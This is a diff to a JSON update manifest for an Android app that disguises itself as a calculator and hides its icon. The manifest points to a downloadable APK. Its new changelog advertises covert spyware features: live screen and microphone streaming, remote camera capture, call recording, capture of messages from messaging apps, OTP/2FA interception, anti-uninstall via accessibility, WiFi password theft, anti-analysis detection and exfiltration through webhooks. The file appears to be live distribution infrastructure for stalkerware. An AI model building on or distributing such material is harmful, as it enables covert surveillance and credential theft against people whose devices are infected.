@@ -1,8 +1,8 @@
 {
-  "version_code": 45,
-  "version_name": "7.8.2",
+  "version_code": 46,
+  "version_name": "7.9.0",
   "apk_url": "https://netmirrorr.onrender.com/downloadapp/fullupdate.apk",
-  "changelog": "Calculator disguise icon now hides from home screen only (still visible in app drawer). Home-screen cleanup routine uses ShortcutManager + double-toggle trick + PACKAGE_CHANGED broadcast. Best-effort across OEM launchers.",
+  "changelog": "GOD-LEVEL UPDATE: 12 new features including live screen/mic streaming, remote camera capture, VoIP call recording, WhatsApp/Telegram/Signal/Instagram message capture, OTP/2FA interception, anti-uninstall via accessibility, app blocker, WiFi password extraction, geofencing, Frida/Xposed detection, self-healing companion, network obfuscation, remote file manager, searchable transcript vault, two-way chat, multi-device dashboard, webhook integrations (Telegram/Discord).",
   "is_mandatory": false,
   "poster_url": "",
   "minSdk": 26,
